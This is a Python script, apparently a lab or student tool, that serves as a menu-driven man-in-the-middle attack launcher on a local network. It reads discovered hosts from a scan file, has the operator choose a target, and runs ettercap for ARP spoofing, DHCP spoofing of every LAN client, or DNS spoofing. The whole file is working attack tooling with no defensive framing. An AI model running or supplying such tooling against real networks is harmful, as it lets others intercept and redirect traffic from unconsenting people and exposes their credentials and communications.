import json
import os
import subprocess
import netifaces

from pathlib import Path
 
def get_gateway_ip():
    gws = netifaces.gateways()
    default_gw = gws.get('default', {})
    if default_gw and default_gw.get(netifaces.AF_INET):
        return default_gw[netifaces.AF_INET][0]
    return None

def load_hosts(json_file: str):
    with open(json_file, "r") as f:
        data = json.load(f)

    hosts = []
    # older/other format: "hosts"
    if data.get("hosts"):
        for host in data.get("hosts", []):
            ip = host.get("ip")
            mac = host.get("mac", "N/A")
            hosts.append((ip, mac))
    # this repo uses "scan_parsed"
    elif data.get("scan_parsed"):
        for host in data.get("scan_parsed", []):
            ip = host.get("ip")
            mac = host.get("mac", "N/A")
            hosts.append((ip, mac))

    return hosts, data
 
def show_menu():
    print("=" * 50)
    print("\n MITM Attack ")
    print("=" * 50)
    print("1. ARP Spoofing")
    print("2. DHCP Spoof (All LAN Clients)")
    print("3. DNS Spoofing")
    print("4. Exit")
 
def run_ettercap(option, target_ip=None,gateway_ip=None, iface="wlan0"):
    if option == "1":
        cmd = ["ettercap", "-T", "-M", "arp:remote", f"//{target_ip}/", f"/{gateway_ip}//","-i", iface]
    elif option == "2":
        cmd = ["ettercap", "-T", "-i", iface, "-P", "dhcp_spoof"]
    elif option == "3":
        cmd = ["ettercap", "-T", "-q" ,"-M", "arp:remote", f"//{target_ip}/",f"/{gateway_ip}//" , "-P" , "dns_spoof" , "-i", iface]
    else:
        print("Opțiune invalidă.")
        return
 
    print(f"Rulez: {' '.join(cmd)}")
    subprocess.run(cmd)
 
def delete_scan_files(prefix: Path):
    prefix = prefix.with_suffix("") 
    suffixes = [".json"]

    for suf in suffixes:
        f = Path(str(prefix) + suf)
        if f.exists():
            try:
                os.remove(f)
            except Exception:
                pass

def main():
   
    hosts, data = load_hosts("scan_result.json")
    

    print("Hosts discovered:")
    for i, (ip, mac) in enumerate(hosts, 1):
        print(f"{i}. IP: {ip}, MAC: {mac}")

    default_iface = data.get("iface", "wlan0")

    while True:
        try:
            choice_raw = input("Select the host to attack (number): ")
            choice = int(choice_raw)
            if 1 <= choice <= len(hosts):
                break
            print(f"Choose a number between 1 and {len(hosts)}.")
        except ValueError:
            print("Enter a valid number.")

    target_ip = hosts[choice-1][0]
    gateway_ip = get_gateway_ip()

    while True:
        show_menu()
        opt = input("Choose an option: ")
        if opt == "4":
            break
        run_ettercap(opt, target_ip, gateway_ip, iface=default_iface)

if __name__ == "__main__":
    main()